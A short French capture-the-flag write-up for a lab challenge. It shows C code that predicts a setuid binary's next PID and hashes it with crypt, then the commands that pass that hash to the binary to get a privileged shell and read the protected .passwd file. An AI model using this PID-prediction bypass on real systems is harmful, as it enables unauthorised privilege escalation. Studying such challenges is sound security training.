# ELF64-Chiffrement-avec-le-PID

On commence par se connecter au server. Une fois dessus, on remarque la présence d'un fichier `.passwd` dont le contenu nous est inaccessible avec notre utilisateur courant. Nous avons un programme qui nous donnera un shell en tant que bon utilisateur en utilisant setuid si nous lui fournissons le bon pid crypté. On doit deviner quel pid il aura lorsque on le lancera.

On crée un programme qui permet de prédire le pid qui sera utilisé et on le chiffre:
```c
#include <stdio.h>
#include <crypt.h>
#include <unistd.h>

int main()
{
        char pid[16];
        snprintf(pid, sizeof(pid), "%i", getpid()+1);
        printf("%s\n", crypt(pid, "$1$awesome"));
}
```

Puis on l'utilise pour appeler le programme qui nous donnera le shell:
```shell
$ cd /tmp
$ gcc crypt.c -lcrypt -o crypt
$ cd
$ ./ch21 `/tmp/crypt`
$1$awesome$Swt6CYXoozbf3nshuMgOs1=$1$awesome$Swt6CYXoozbf3nshuMgOs1WIN!
bash-4.3$ cat .passwd
xxxxxxxxxxxx
```
